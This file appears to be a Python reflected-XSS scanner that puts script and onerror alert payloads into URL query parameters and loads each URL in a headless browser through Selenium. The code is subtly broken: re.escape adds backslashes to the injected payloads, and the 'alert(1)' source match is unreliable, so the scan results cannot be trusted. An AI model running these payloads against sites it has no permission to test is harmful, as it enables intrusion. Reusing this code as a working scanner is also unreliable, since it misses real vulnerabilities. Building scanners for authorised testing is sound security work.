import argparse
import re
import time
import logging
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.firefox.options import Options as FirefoxOptions

# تنظیمات logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def parse_args():
    parser = argparse.ArgumentParser(description='Reflected XSS vulnerability scanner')
    parser.add_argument('input', metavar='INPUT', type=str, help='Single URL or path to a file containing list of URLs')
    parser.add_argument('--browser', type=str, choices=['chrome', 'firefox'], default='chrome', help='Browser to use for scanning (default: chrome)')
    return parser.parse_args()

def read_urls(input_path):
    try:
        with open(input_path, 'r') as file:
            urls = file.read().splitlines()
        return urls
    except FileNotFoundError:
        logging.error(f'File not found: {input_path}')
        return []

def extract_params(url):
    pattern = re.compile(r'(\?|\&)([^=]+)\=([^&]*)')
    return pattern.findall(url)

def generate_payloads(url, params):
    payloads = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '\ "-alert(1)}//',
        '"alert(1)-/><script>///'
    ]
    
    urls_with_payloads = []
    for param in params:
        for payload in payloads:
            new_url = re.sub(f'{param[1]}={re.escape(param[2])}', f'{param[1]}={re.escape(payload)}', url)
            urls_with_payloads.append(new_url)
    return urls_with_payloads

def check_xss(url, browser):
    logging.info(f'Testing URL: {url} with browser: {browser}')
    
    if browser == 'chrome':
        chrome_options = ChromeOptions()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        service = ChromeService()
        driver = webdriver.Chrome(service=service, options=chrome_options)
    elif browser == 'firefox':
        firefox_options = FirefoxOptions()
        firefox_options.add_argument('--headless')
        service = FirefoxService()
        driver = webdriver.Firefox(service=service, options=firefox_options)
    
    try:
        driver.get(url)
        time.sleep(3)
        
        if "alert(1)" in driver.page_source:
            logging.warning(f'Potential XSS vulnerability found at: {url}')
        else:
            logging.info(f'No XSS vulnerability found at: {url}')
    except Exception as e:
        logging.error(f'Error testing URL {url}: {e}')
    finally:
        driver.quit()

def main():
    args = parse_args()
    
    if args.input.startswith('http://') or args.input.startswith('https://'):
        urls = [args.input]
    else:
        urls = read_urls(args.input)
    
    if not urls:
        logging.error('No URLs to test.')
        return
    
    for url in urls:
        logging.info(f'Starting scan for URL: {url}')
        params = extract_params(url)
        
        if params:
            urls_with_payloads = generate_payloads(url, params)
            for test_url in urls_with_payloads:
                check_xss(test_url, args.browser)
        else:
            logging.info(f'No parameters found in {url}')

if __name__ == '__main__':
    main()
